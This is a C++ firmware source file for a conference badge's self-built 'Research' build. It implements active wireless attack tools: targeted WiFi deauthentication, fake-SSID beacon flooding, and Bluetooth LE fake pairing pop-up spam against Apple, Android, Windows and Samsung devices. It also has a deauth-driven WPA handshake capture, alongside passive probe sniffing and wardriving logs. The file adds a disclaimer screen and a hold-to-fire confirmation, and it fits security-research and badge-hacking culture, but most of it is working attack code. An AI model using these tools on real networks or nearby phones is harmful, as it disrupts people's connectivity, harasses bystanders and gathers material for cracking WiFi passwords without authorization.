// AppResearch.cpp — the opt-in "Research" build's home for ACTIVE WiFi/BT tools.
//
// SAFETY MODEL: everything here is behind #if BADGE_OFFENSIVE, which ONLY the
// utah_bsides_research PlatformIO env sets. The shipped, signed badge is built from
// the plain utah_bsides env, so these tools are COMPILED OUT of it entirely — not
// hidden behind a menu or a password, simply absent. A distributed badge cannot run
// them because the code is not in its binary. The research build is self-built and
// unsigned by design.
//
// The passive detectors (deauth/spam/drone/tracker spotting in BadgeRadioScan) are in
// EVERY build and are untouched by this file; this is only the active/transmit side.
//
// Tools, each behind the disclaimer accept + a HOLD-to-fire confirmation:
//   - Targeted deauth  : TX deauth frames at ONE AP you pick, on its channel (WiFi).
//   - Beacon spam      : flood fake WiFi SSIDs from one random BSSID (WiFi, karma style).
//   - BLE pairing spam : Apple/Android fake pairing pop-ups with a rotating address (NimBLE).
//       NOTE: BLE spam HIJACKS the one NimBLE advertiser Meshtastic uses for the phone link,
//       so the phone BLE connection DROPS while it runs; it is restored on stop.
#include "BadgeApps.h"

#if BADGE_OFFENSIVE

#include "configuration.h"

#include "BadgeApp.h"
#include "BadgeCapture.h" // captureWifiSet(): handshakes -> wifi.pcap
#include "BadgeRadioScan.h"
#include "main.h" // nimbleBluetooth

#include "mesh/wifi/WiFiAPClient.h" // isWifiAvailable()
#include "nimble/NimbleBluetooth.h"

#include "graphics/Screen.h"
#include "graphics/ScreenFonts.h"

#include "host/ble_gap.h"
#include "host/ble_hs_id.h"

#include "FSCommon.h" // wardrive CSV log
#include "SPILock.h"

#include <Preferences.h>
#include <WiFi.h>
#include <esp_random.h>
#include <esp_wifi.h>
#include <string.h>

namespace badge
{

// ---- disclaimer consent (NVS "utah" / "rschack") -------------------------------------------
static bool disclaimerEverAccepted()
{
    Preferences p;
    bool v = false;
    if (p.begin("utah", true)) {
        v = p.getInt("rschack", 0) != 0;
        p.end();
    }
    return v;
}
static void rememberDisclaimerAccepted()
{
    Preferences p;
    if (p.begin("utah", false)) {
        p.putInt("rschack", 1);
        p.end();
    }
}

// ---- full-screen "RESEARCH BUILD" boot page (after the raven, before the lock gifs) ----------
class ResearchBootApp : public App
{
    uint32_t shownAt = 0;

  public:
    const char *name() const override { return "ResearchBoot"; }
    uint32_t frameMs() const override { return 400; }
    bool keepAwake() const override { return true; }
    void begin() override { shownAt = millis(); }
    void tick(uint32_t now) override
    {
        if (now - shownAt > 3000)
            appClose();
    }
    void key(int k, KeyAction a) override
    {
        (void)k;
        if (a == KA_RELEASE)
            appClose();
    }
    void draw(OLEDDisplay *d, int16_t x, int16_t y) override
    {
        d->setColor(BLACK);
        d->fillRect(x, y, d->width(), d->height());
        d->setColor(WHITE);
        int lh = fontHeight(FONT_SMALL);
        int top = y + d->height() / 2 - 2 * lh;
        drawCentered(d, x, top, "RESEARCH BUILD", FONT_MEDIUM);
        drawCentered(d, x, top + 2 * lh, "active tools enabled", FONT_SMALL);
        drawCentered(d, x, top + 3 * lh, "authorized use only", FONT_SMALL);
    }
};
static ResearchBootApp researchBootApp;
void openResearchBoot()
{
    appOpen(&researchBootApp);
}

// ---- WiFi frame injection (deauth + beacon) ------------------------------------------------
// Both ride the scanner's STA + promiscuous WiFi and esp_wifi_80211_tx.
static const uint8_t DEAUTH_TEMPLATE[26] = {
    0xC0, 0x00,                         // frame control: mgmt / deauth
    0x00, 0x00,                         // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // addr1: destination = broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr2: source = BSSID (filled in)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr3: BSSID        (filled in)
    0x00, 0x00,                         // seq
    0x07, 0x00                          // reason code 7
};
static int deauthBurst(const uint8_t bssid[6], uint8_t channel, int n)
{
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    uint8_t f[26];
    memcpy(f, DEAUTH_TEMPLATE, sizeof(f));
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
    int ok = 0;
    for (int i = 0; i < n; i++)
        if (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false) == ESP_OK)
            ok++;
    return ok;
}

static const char *const BEACON_SSIDS[] = {
    "FBI Surveillance Van", "Free Public WiFi",  "Pretty Fly for a WiFi", "Loading...",
    "Mom Use This One",     "Hidden Network",    "The LAN Before Time",   "Drop It Like Its Hotspot",
    "404 Network Down",     "Abraham Linksys",   "Bill Wi the Science Fi", "It Hurts When IP",
};
static const int NUM_BEACON_SSIDS = sizeof(BEACON_SSIDS) / sizeof(BEACON_SSIDS[0]);

// One 802.11 beacon (subtype 8) advertising `ssid` from `bssid` on `channel`.
static int beaconOnce(const uint8_t bssid[6], const char *ssid, uint8_t channel)
{
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    uint8_t f[128];
    int n = 0;
    const uint8_t hdr[] = {0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(f, hdr, sizeof(hdr));
    n = sizeof(hdr);
    memcpy(f + n, bssid, 6);
    n += 6; // addr2 (source)
    memcpy(f + n, bssid, 6);
    n += 6; // addr3 (BSSID)
    f[n++] = 0x00;
    f[n++] = 0x00; // seq
    for (int i = 0; i < 8; i++)
        f[n++] = 0x00; // timestamp
    f[n++] = 0x64;
    f[n++] = 0x00; // beacon interval (100 ms)
    f[n++] = 0x01;
    f[n++] = 0x04; // capability (ESS)
    int slen = (int)strlen(ssid);
    if (slen > 32)
        slen = 32;
    f[n++] = 0x00;
    f[n++] = (uint8_t)slen;
    memcpy(f + n, ssid, slen);
    n += slen; // SSID element
    const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    memcpy(f + n, rates, sizeof(rates));
    n += sizeof(rates); // supported rates
    f[n++] = 0x03;
    f[n++] = 0x01;
    f[n++] = channel; // DS param (channel)
    return esp_wifi_80211_tx(WIFI_IF_STA, f, n, false) == ESP_OK ? 1 : 0;
}

// ---- BLE pairing-popup spam (NimBLE) -------------------------------------------------------
// Apple "nearby action" / Google Fast Pair adverts with a fresh random address each time, so
// nearby phones show a stream of fake pairing pop-ups. This HIJACKS the one NimBLE advertising
// slot Meshtastic uses for the phone link (so that link drops while running); bleSpamStop()
// restores Meshtastic's advert.
static const uint8_t APPLE_ACTIONS[] = {0x27, 0x09, 0x02, 0x1e, 0x13, 0x0b,
                                        0x01, 0x06, 0x20, 0xc0, 0x0d, 0x2b};
static const uint32_t FASTPAIR_MODELS[] = {0xCD8256, 0x92BBBD, 0x821F66, 0x475453, 0x0001F0, 0x0003B9, 0x00000A};
// Fake device names for the scan response, so each advert looks like a different device instead of
// the badge's own Meshtastic name.
static const char *const BLE_NAMES[] = {"AirPods",   "AirPods Pro", "Galaxy Buds", "Pixel Buds", "JBL Flip",
                                        "Beats Pro", "Bose QC",     "Mi Band 8",   "Echo Buds",  "Tile",
                                        "WH-1000XM5", "Soundcore"};

static void bleSetRandomAddr()
{
    uint8_t a[6];
    for (int i = 0; i < 6; i++)
        a[i] = esp_random() & 0xFF;
    a[5] |= 0xC0; // static random address (top two bits set)
    ble_hs_id_set_rnd(a);
}
// target: 0 Apple, 1 Android, 2 both. Returns 1 if an advert went out.
static int bleSpamOnce(int target)
{
    ble_gap_adv_stop();
    bleSetRandomAddr();
    uint8_t d[31];
    int n = 0;
    d[n++] = 0x02;
    d[n++] = 0x01;
    d[n++] = 0x1A; // flags
    int kind = (target < 4) ? target : (int)(esp_random() % 4); // 4 = All -> random kind
    if (kind == 0) {         // Apple nearby action
        d[n++] = 0x0A;
        d[n++] = 0xFF;
        d[n++] = 0x4C;
        d[n++] = 0x00; // mfg data, Apple
        d[n++] = 0x0F;
        d[n++] = 0x05;
        d[n++] = 0xC1; // nearby action
        d[n++] = APPLE_ACTIONS[esp_random() % sizeof(APPLE_ACTIONS)];
        d[n++] = esp_random() & 0xFF;
        d[n++] = esp_random() & 0xFF;
        d[n++] = esp_random() & 0xFF;
    } else if (kind == 1) {  // Google Fast Pair (Android)
        uint32_t m = FASTPAIR_MODELS[esp_random() % (sizeof(FASTPAIR_MODELS) / sizeof(uint32_t))];
        d[n++] = 0x06;
        d[n++] = 0x16;
        d[n++] = 0x2C;
        d[n++] = 0xFE; // service data, Fast Pair 0xFE2C
        d[n++] = (m >> 16) & 0xFF;
        d[n++] = (m >> 8) & 0xFF;
        d[n++] = m & 0xFF;
    } else if (kind == 2) {  // Windows Swift Pair (Microsoft 0x0006)
        const char *nm = BLE_NAMES[esp_random() % (sizeof(BLE_NAMES) / sizeof(char *))];
        int nl = (int)strlen(nm);
        if (nl > 8)
            nl = 8;
        d[n++] = (uint8_t)(6 + nl);
        d[n++] = 0xFF;
        d[n++] = 0x06;
        d[n++] = 0x00; // Microsoft
        d[n++] = 0x03;
        d[n++] = 0x00;
        d[n++] = 0x80; // beacon, Swift Pair scenario
        memcpy(d + n, nm, nl);
        n += nl;
    } else {                 // Samsung EasySetup / Buds (Samsung 0x0075) — best effort
        d[n++] = 0x0F;
        d[n++] = 0xFF;
        d[n++] = 0x75;
        d[n++] = 0x00; // Samsung
        d[n++] = 0x01;
        d[n++] = 0x00;
        d[n++] = 0x02;
        d[n++] = 0x00;
        d[n++] = 0x01;
        d[n++] = 0x01;
        d[n++] = 0xFF;
        d[n++] = 0x00;
        d[n++] = 0x00;
        d[n++] = 0x43;
        d[n++] = esp_random() & 0xFF; // buds-ish model id
    }
    if (ble_gap_adv_set_data(d, n) != 0)
        return 0;
    // Random scan-response name per advert (overrides the auto-filled GAP/Meshtastic name).
    char nm[24];
    snprintf(nm, sizeof(nm), "%s %02X", BLE_NAMES[esp_random() % (sizeof(BLE_NAMES) / sizeof(char *))],
             (unsigned)(esp_random() & 0xFF));
    uint8_t sr[31];
    int sn = 0, nl = (int)strlen(nm);
    if (nl > 28)
        nl = 28;
    sr[sn++] = (uint8_t)(nl + 1);
    sr[sn++] = 0x09; // complete local name
    memcpy(sr + sn, nm, nl);
    sn += nl;
    ble_gap_adv_rsp_set_data(sr, sn);
    struct ble_gap_adv_params ap;
    memset(&ap, 0, sizeof(ap));
    ap.conn_mode = BLE_GAP_CONN_MODE_NON;
    ap.disc_mode = BLE_GAP_DISC_MODE_GEN;
    return ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &ap, NULL, NULL) == 0 ? 1 : 0;
}
static void bleSpamStop()
{
    ble_gap_adv_stop();
    if (nimbleBluetooth)
        nimbleBluetooth->startAdvertising(); // restore Meshtastic's phone-link advert
}
// Drop any active BLE connection (the Meshtastic phone link) so the controller is free to
// advertise our spam — a connected device doesn't advertise. Meshtastic re-advertises its own
// data on disconnect; we out-pace it. This is the "drops the phone link" behaviour, as warned.
static void bleFreeAdvertiser()
{
    for (uint16_t h = 0; h < 10; h++) {
        struct ble_gap_conn_desc desc;
        if (ble_gap_conn_find(h, &desc) == 0)
            ble_gap_terminate(h, 0x13 /* remote user terminated */);
    }
    ble_gap_adv_stop();
}

// ---- probe-request sniffer (passive) -------------------------------------------------------
// Logs the SSIDs nearby devices actively probe for (their saved/known networks), with the source
// MAC and RSSI. Listen-only: our own promiscuous RX callback over the scanner's WiFi.
struct Probe {
    char ssid[33];
    uint8_t mac[6];
    int8_t rssi;
};
static const int MAX_PROBES = 24;
static Probe g_probes[MAX_PROBES];
static volatile int g_nProbes = 0;
static portMUX_TYPE g_probeLock = portMUX_INITIALIZER_UNLOCKED;

static void probeReset()
{
    portENTER_CRITICAL(&g_probeLock);
    g_nProbes = 0;
    portEXIT_CRITICAL(&g_probeLock);
}
static void IRAM_ATTR probeCb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT)
        return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    if ((p[0] & 0x0C) != 0x00 || (p[0] >> 4) != 0x04) // mgmt frame, subtype 4 (probe request)
        return;
    if (p[24] != 0x00) // first tagged parameter must be the SSID element
        return;
    int slen = p[25];
    if (slen <= 0 || slen > 32) // wildcard probe or junk
        return;
    const uint8_t *src = p + 10;  // addr2 (the probing device)
    const uint8_t *ssid = p + 26; // SSID bytes
    portENTER_CRITICAL(&g_probeLock);
    for (int i = 0; i < g_nProbes; i++)
        if (memcmp(g_probes[i].mac, src, 6) == 0 && (int)strlen(g_probes[i].ssid) == slen &&
            memcmp(g_probes[i].ssid, ssid, slen) == 0) {
            g_probes[i].rssi = pkt->rx_ctrl.rssi; // seen before: just refresh signal
            portEXIT_CRITICAL(&g_probeLock);
            return;
        }
    int idx = g_nProbes < MAX_PROBES ? g_nProbes++ : (MAX_PROBES - 1);
    memcpy(g_probes[idx].mac, src, 6);
    memcpy(g_probes[idx].ssid, ssid, slen);
    g_probes[idx].ssid[slen] = 0;
    g_probes[idx].rssi = pkt->rx_ctrl.rssi;
    portEXIT_CRITICAL(&g_probeLock);
}

// ---- packet monitor (passive) -------------------------------------------------------------
// Counts every 802.11 frame heard, for a live packets/sec activity meter. Listen-only: our own
// promiscuous RX callback that only increments a counter.
static volatile uint32_t g_pktCount = 0;
static void IRAM_ATTR pktCountCb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    (void)buf;
    (void)type;
    g_pktCount++;
}

// ---- wardriving (passive) -----------------------------------------------------------------
// Logs each AP heard once to /badge/wardrive.csv (WiGLE-style; coordinates stay blank until a GPS
// module is fitted on a future board). Uses the normal scanner; listen-only.
static uint32_t g_wdHashes[128];
static int g_wdCount = 0;

// ---- the app ------------------------------------------------------------------------------
static const uint32_t FIRE_HOLD_MS = 2000;
static const int BURST = 8;      // deauth frames per 10 ms tick
static const int BLE_GAP_MS = 40; // min gap between BLE adverts
static const int MAX_APS = 32;

class ResearchApp : public App
{
    enum Tool { T_DEAUTH, T_BEACON, T_BLE, T_PROBE, T_HANDSHAKE, T_PKTMON, T_WARDRIVE };
    enum Phase { P_DISCLAIMER, P_LIST, P_PICK, P_CONFIRM, P_FIRE, P_PROBE };
    Phase phase = P_DISCLAIMER;
    Tool tool = T_DEAUTH;
    int sel = 0, top = 0;
    uint8_t hopCh = 1;              // probe sniffer / packet monitor channel hop
    uint32_t pktRate = 0, pktLast = 0; // packet monitor

    ScanEntry aps[MAX_APS];
    int nAps = 0;
    const char *scanErr = nullptr;

    uint8_t tgtMac[6] = {0}; // deauth target
    uint8_t tgtCh = 0;
    char tgtName[33] = {0};

    uint8_t spamBssid[6] = {0}; // beacon: one BSSID per session (karma style)
    int ssidIdx = 0;
    int bleTarget = 2; // 0 Apple, 1 Android, 2 both

    uint32_t hashDownAt = 0;
    uint32_t frames = 0;
    uint32_t lastPoll = 0, lastPaint = 0, lastTx = 0;

    static const int NUM_TOOLS = 8; // Back + 7 tools
    static const char *const TOOLS[NUM_TOOLS];

    void stopAll()
    {
        radioScanStop();
        bleSpamStop();
        captureWifiSet(false);
    }
    void startHandshake()
    {
        captureWifiSet(true); // BEFORE the scan, so the promiscuous filter includes DATA (EAPOL)
        startPick();          // reuse the deauth AP picker
    }
    void startPick()
    {
        scanErr = radioScanStart(SCAN_WIFI);
        nAps = 0;
        sel = 0;
        top = 0;
        lastPoll = 0;
        phase = P_PICK;
    }
    void startBeacon()
    {
        scanErr = radioScanStart(SCAN_WIFI);
        for (int i = 0; i < 6; i++)
            spamBssid[i] = esp_random() & 0xFF;
        spamBssid[0] = (spamBssid[0] & 0xFE) | 0x02; // locally-administered unicast
        ssidIdx = 0;
        hashDownAt = 0;
        phase = P_CONFIRM;
    }
    void startBle()
    {
        scanErr = nullptr;
        bleTarget = 4; // All
        hashDownAt = 0;
        phase = P_CONFIRM;
    }
    void startProbe()
    {
        scanErr = radioScanStart(SCAN_WIFI); // brings WiFi + promiscuous up (if the badge owns WiFi)
        if (!scanErr) {
            probeReset();
            esp_wifi_set_promiscuous_rx_cb(probeCb); // take over the RX callback for probe requests
        }
        hopCh = 1;
        lastPoll = 0;
        phase = P_PROBE;
    }
    void startPktmon()
    {
        scanErr = radioScanStart(SCAN_WIFI);
        if (!scanErr)
            esp_wifi_set_promiscuous_rx_cb(pktCountCb); // count-only RX callback
        g_pktCount = 0;
        pktRate = 0;
        pktLast = 0;
        hopCh = 1;
        lastPoll = 0;
        phase = P_PROBE;
    }
    void startWardrive()
    {
        scanErr = radioScanStart(SCAN_WIFI); // keep the scanner's own callback (populates the AP list)
        g_wdCount = 0;
        lastPoll = 0;
        phase = P_PROBE;
    }
    void wardriveLog()
    {
        int n = radioScanSnapshot(aps, MAX_APS);
        for (int i = 0; i < n && g_wdCount < 128; i++) {
            if (aps[i].channel == 0)
                continue; // WiFi only
            const uint8_t *m = aps[i].mac;
            uint32_t h = ((uint32_t)m[2] << 24) | (m[3] << 16) | (m[4] << 8) | m[5];
            bool seen = false;
            for (int j = 0; j < g_wdCount; j++)
                if (g_wdHashes[j] == h) {
                    seen = true;
                    break;
                }
            if (seen)
                continue;
            g_wdHashes[g_wdCount++] = h;
            concurrency::LockGuard g(spiLock);
            bool fresh = !FSCom.exists("/badge/wardrive.csv");
            File f = FSCom.open("/badge/wardrive.csv", "a");
            if (!f)
                continue;
            if (fresh) // WiGLE-style header; lat/lon columns stay blank until a GPS is fitted
                f.print("MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,"
                        "AltitudeMeters,AccuracyMeters,Type\n");
            char line[128];
            snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X,%s,[%s],,%d,%d,,,,,WIFI\n", m[0], m[1], m[2],
                     m[3], m[4], m[5], aps[i].name, (aps[i].flags & SF_OPEN) ? "OPEN" : "WPA2", aps[i].channel,
                     aps[i].rssi);
            f.print(line);
            f.close();
        }
    }

    void refreshAps()
    {
        int n = radioScanSnapshot(aps, MAX_APS);
        int k = 0;
        for (int i = 0; i < n; i++)
            if (aps[i].channel > 0) {
                if (k != i)
                    aps[k] = aps[i];
                k++;
            }
        nAps = k;
        if (sel >= nAps)
            sel = nAps > 0 ? nAps - 1 : 0;
    }

    void holdPrompt(char *b, size_t nb)
    {
        if (hashDownAt) {
            uint32_t held = millis() - hashDownAt;
            int pct = (int)(held * 100 / FIRE_HOLD_MS);
            if (pct > 100)
                pct = 100;
            snprintf(b, nb, "FIRING in... %d%%", pct);
        } else {
            snprintf(b, nb, "HOLD # 2s to fire");
        }
    }

  public:
    const char *name() const override { return "Research"; }
    uint32_t frameMs() const override { return 400; }
    bool keepAwake() const override { return true; }

    void begin() override
    {
        phase = P_DISCLAIMER;
        sel = 0;
        frames = 0;
        hashDownAt = 0;
    }
    void end() override { stopAll(); }

    void tick(uint32_t now) override
    {
        if (phase == P_PICK) {
            radioScanPoll();
            if (now - lastPoll > 400) {
                lastPoll = now;
                refreshAps();
                appRedraw();
            }
            return;
        }
        if (phase == P_PROBE) {
            if (tool == T_WARDRIVE) { // uses the scanner's own callback; drive it + log new APs
                radioScanPoll();
                if (now - lastPoll > 600) {
                    lastPoll = now;
                    wardriveLog();
                    appRedraw();
                }
                return;
            }
            if (now - lastPoll > 250) { // probe sniffer / packet monitor: hop channels ourselves
                lastPoll = now;
                hopCh = hopCh % 13 + 1;
                esp_wifi_set_channel(hopCh, WIFI_SECOND_CHAN_NONE);
                if (tool == T_PKTMON) {
                    pktRate = (g_pktCount - pktLast) * 4; // per-250ms delta -> ~per-second rate
                    pktLast = g_pktCount;
                }
                appRedraw();
            }
            return;
        }
        if (phase == P_CONFIRM) {
            if (hashDownAt && now - hashDownAt >= FIRE_HOLD_MS) {
                frames = 0;
                hashDownAt = 0; // clear the hold so returning to confirm doesn't instantly re-fire
                lastTx = 0;
                if (tool == T_DEAUTH || tool == T_HANDSHAKE)
                    radioScanFocus(tgtMac, tgtCh); // pin WiFi to the target channel
                else if (tool == T_BLE)
                    bleFreeAdvertiser(); // drop the phone link so the badge can advertise
                phase = P_FIRE;
                appRedraw();
            } else if (hashDownAt && now - lastPaint > 150) {
                lastPaint = now;
                appRedraw();
            }
            return;
        }
        if (phase == P_FIRE) {
            if (tool == T_DEAUTH || tool == T_HANDSHAKE) {
                frames += deauthBurst(tgtMac, tgtCh, BURST); // handshake: deauth to force reconnects
            } else if (tool == T_BEACON) {
                frames += beaconOnce(spamBssid, BEACON_SSIDS[ssidIdx], 1);
                ssidIdx = (ssidIdx + 1) % NUM_BEACON_SSIDS;
            } else if (tool == T_BLE && now - lastTx > BLE_GAP_MS) {
                lastTx = now;
                frames += bleSpamOnce(bleTarget);
            }
            if (now - lastPaint > 200) {
                lastPaint = now;
                appRedraw();
            }
        }
    }

    void key(int k, KeyAction a) override
    {
        if (phase == P_CONFIRM && k == AK_HASH) {
            if (a == KA_PRESS)
                hashDownAt = millis();
            else if (a == KA_RELEASE)
                hashDownAt = 0;
            return;
        }
        if (a != KA_RELEASE)
            return;

        switch (phase) {
        case P_DISCLAIMER:
            if (k == AK_HASH) {
                rememberDisclaimerAccepted();
                phase = P_LIST;
                sel = 0;
            } else if (k == AK_STAR)
                appClose();
            break;

        case P_LIST:
            if (k == AK_UP)
                sel = (sel + NUM_TOOLS - 1) % NUM_TOOLS;
            else if (k == AK_DOWN)
                sel = (sel + 1) % NUM_TOOLS;
            else if (k == AK_STAR)
                appClose();
            else if (k == AK_HASH) {
                if (sel == 0)
                    appClose();
                else if (sel == 1) {
                    tool = T_DEAUTH;
                    startPick();
                } else if (sel == 2) {
                    tool = T_BEACON;
                    startBeacon();
                } else if (sel == 3) {
                    tool = T_BLE;
                    startBle();
                } else if (sel == 4) {
                    tool = T_PROBE;
                    startProbe();
                } else if (sel == 5) {
                    tool = T_HANDSHAKE;
                    startHandshake();
                } else if (sel == 6) {
                    tool = T_PKTMON;
                    startPktmon();
                } else {
                    tool = T_WARDRIVE;
                    startWardrive();
                }
            }
            appRedraw();
            break;

        case P_PICK:
            if (scanErr) {
                if (k == AK_STAR) {
                    stopAll();
                    phase = P_LIST;
                    appRedraw();
                }
                break;
            }
            if (k == AK_UP && nAps)
                sel = (sel + nAps - 1) % nAps;
            else if (k == AK_DOWN && nAps)
                sel = (sel + 1) % nAps;
            else if (k == AK_STAR) {
                stopAll();
                phase = P_LIST;
            } else if (k == AK_HASH && nAps) {
                memcpy(tgtMac, aps[sel].mac, 6);
                tgtCh = aps[sel].channel;
                snprintf(tgtName, sizeof(tgtName), "%s", aps[sel].name[0] ? aps[sel].name : "(hidden)");
                hashDownAt = 0;
                phase = P_CONFIRM;
            }
            appRedraw();
            break;

        case P_CONFIRM:
            if (k == AK_STAR) {
                if (tool == T_DEAUTH || tool == T_HANDSHAKE)
                    phase = P_PICK; // back to the picker (scan still running)
                else {
                    stopAll();
                    phase = P_LIST;
                }
            } else if (tool == T_BLE && k == AK_UP)
                bleTarget = (bleTarget + 5 - 1) % 5;
            else if (tool == T_BLE && k == AK_DOWN)
                bleTarget = (bleTarget + 1) % 5;
            appRedraw();
            break;

        case P_FIRE:
            if (k == AK_STAR) {
                if (tool == T_BLE)
                    bleSpamStop(); // stop advertising; restore the phone link
                phase = P_CONFIRM;
            }
            appRedraw();
            break;

        case P_PROBE:
            if (k == AK_STAR) {
                stopAll();
                phase = P_LIST;
            }
            appRedraw();
            break;
        }
    }

    void draw(OLEDDisplay *d, int16_t x, int16_t y) override
    {
        int lh = fontHeight(FONT_SMALL);
        d->setFont(FONT_SMALL);
        d->setTextAlignment(TEXT_ALIGN_LEFT);
        int ry = y + lh + 2;
        char b[48];
        static const char *const BLE_T[] = {"Apple", "Android", "Windows", "Samsung", "All"};

        switch (phase) {
        case P_DISCLAIMER:
            drawTitle(d, x, y, "Research tools");
            d->drawString(x + 2, ry, "ACTIVE tools. Use only");
            d->drawString(x + 2, ry + lh, "on networks you own or");
            d->drawString(x + 2, ry + 2 * lh, "are authorized to test.");
            d->drawString(x + 2, ry + 3 * lh, "You are responsible for");
            d->drawString(x + 2, ry + 4 * lh, "law + event rules.");
            drawFooter(d, x, y, disclaimerEverAccepted() ? "#: accept   *: exit" : "#: I agree   *: exit");
            break;

        case P_LIST:
            drawTitle(d, x, y, "Research tools");
            for (int i = 0; i < NUM_TOOLS; i++) {
                snprintf(b, sizeof(b), "%s%s", i == sel ? "> " : "  ", TOOLS[i]);
                d->drawString(x + 2, ry + i * lh, b);
            }
            drawFooter(d, x, y, "#: select   *: back");
            break;

        case P_PICK: {
            drawTitle(d, x, y, tool == T_HANDSHAKE ? "Handshake: pick AP" : "Deauth: pick AP");
            if (scanErr) {
                d->drawString(x + 2, ry, scanErr);
                drawFooter(d, x, y, "*: back");
                break;
            }
            if (nAps == 0) {
                if (isWifiAvailable()) {
                    d->drawString(x + 2, ry, "Mesh WiFi is ON.");
                    d->drawString(x + 2, ry + lh, "Turn it off in the");
                    d->drawString(x + 2, ry + 2 * lh, "phone app to scan.");
                } else {
                    d->drawString(x + 2, ry, "scanning...");
                }
                drawFooter(d, x, y, "*: back");
                break;
            }
            int rows = 4;
            if (sel < top)
                top = sel;
            else if (sel >= top + rows)
                top = sel - rows + 1;
            for (int i = 0; i < rows && top + i < nAps; i++) {
                const ScanEntry &e = aps[top + i];
                char nm[18];
                snprintf(nm, sizeof(nm), "%s", e.name[0] ? e.name : "(hidden)");
                snprintf(b, sizeof(b), "%s%-17s c%-2d", top + i == sel ? ">" : " ", nm, e.channel);
                d->drawString(x + 2, ry + i * lh, b);
            }
            snprintf(b, sizeof(b), "%d APs   #: select  *: back", nAps);
            drawFooter(d, x, y, b);
            break;
        }

        case P_CONFIRM: {
            if (tool == T_DEAUTH || tool == T_HANDSHAKE) {
                drawTitle(d, x, y, tool == T_HANDSHAKE ? "Handshake: confirm" : "Deauth: confirm");
                d->drawString(x + 2, ry, tgtName);
                snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X", tgtMac[0], tgtMac[1], tgtMac[2], tgtMac[3],
                         tgtMac[4], tgtMac[5]);
                d->drawString(x + 2, ry + lh, b);
                snprintf(b, sizeof(b), "channel %d", tgtCh);
                d->drawString(x + 2, ry + 2 * lh, b);
                d->drawString(x + 2, ry + 3 * lh, isWifiAvailable() ? "! Mesh WiFi ON - turn off" : "Needs Mesh WiFi off");
            } else if (tool == T_BEACON) {
                drawTitle(d, x, y, "Beacon spam: confirm");
                d->drawString(x + 2, ry, "Floods fake WiFi");
                d->drawString(x + 2, ry + lh, "SSIDs on channel 1.");
                d->drawString(x + 2, ry + 3 * lh, isWifiAvailable() ? "! Mesh WiFi ON - turn off" : "Needs Mesh WiFi off");
            } else {
                drawTitle(d, x, y, "BLE spam: confirm");
                snprintf(b, sizeof(b), "Target: %s (up/dn)", BLE_T[bleTarget]);
                d->drawString(x + 2, ry, b);
                d->drawString(x + 2, ry + 2 * lh, "! DROPS Meshtastic");
                d->drawString(x + 2, ry + 3 * lh, "  BLE phone link");
            }
            holdPrompt(b, sizeof(b));
            d->drawString(x + 2, ry + 4 * lh + 2, b);
            drawFooter(d, x, y, "hold #: fire   *: back");
            break;
        }

        case P_FIRE:
            if (tool == T_DEAUTH) {
                drawTitle(d, x, y, "Deauth: FIRING");
                d->drawString(x + 2, ry, tgtName);
                snprintf(b, sizeof(b), "ch %d", tgtCh);
                d->drawString(x + 2, ry + lh, b);
                snprintf(b, sizeof(b), "frames sent: %lu", (unsigned long)frames);
                d->drawString(x + 2, ry + 2 * lh, b);
                if (frames == 0)
                    d->drawString(x + 2, ry + 3 * lh, isWifiAvailable() ? "0 TX: Mesh WiFi is ON" : "0 TX: radio busy?");
            } else if (tool == T_HANDSHAKE) {
                drawTitle(d, x, y, "Handshake: FIRING");
                d->drawString(x + 2, ry, tgtName);
                snprintf(b, sizeof(b), "ch %d  deauths %lu", tgtCh, (unsigned long)frames);
                d->drawString(x + 2, ry + lh, b);
                d->drawString(x + 2, ry + 2 * lh, "capturing -> wifi.pcap");
                d->drawString(x + 2, ry + 3 * lh, "get it via Badge WiFi");
            } else if (tool == T_BEACON) {
                drawTitle(d, x, y, "Beacon: FIRING");
                snprintf(b, sizeof(b), "SSIDs sent: %lu", (unsigned long)frames);
                d->drawString(x + 2, ry, b);
                d->drawString(x + 2, ry + lh, "ch 1, rotating names");
                if (frames == 0)
                    d->drawString(x + 2, ry + 2 * lh, isWifiAvailable() ? "0 TX: Mesh WiFi is ON" : "0 TX: radio busy?");
            } else {
                drawTitle(d, x, y, "BLE spam: FIRING");
                snprintf(b, sizeof(b), "target: %s", BLE_T[bleTarget]);
                d->drawString(x + 2, ry, b);
                snprintf(b, sizeof(b), "pop-ups sent: %lu", (unsigned long)frames);
                d->drawString(x + 2, ry + lh, b);
                d->drawString(x + 2, ry + 2 * lh, "Meshtastic BLE link");
                d->drawString(x + 2, ry + 3 * lh, "is DROPPED while on");
                if (frames == 0)
                    d->drawString(x + 2, ry + 4 * lh, "no adv yet...");
            }
            drawFooter(d, x, y, "*: STOP");
            break;

        case P_PROBE: {
            if (tool == T_PKTMON) {
                drawTitle(d, x, y, "Packet monitor");
                if (scanErr) {
                    d->drawString(x + 2, ry, scanErr);
                    drawFooter(d, x, y, "*: back");
                    break;
                }
                snprintf(b, sizeof(b), "%lu pkt/s", (unsigned long)pktRate);
                d->drawString(x + 2, ry + lh, b);
                int bars = pktRate > 40 ? 40 : (int)pktRate; // simple activity bar (0..40)
                char g[42];
                int gi = 0;
                for (; gi < bars; gi++)
                    g[gi] = '#';
                g[gi] = 0;
                d->drawString(x + 2, ry + 2 * lh, g);
                snprintf(b, sizeof(b), "ch %d   *: stop", hopCh);
                drawFooter(d, x, y, b);
                break;
            }
            if (tool == T_WARDRIVE) {
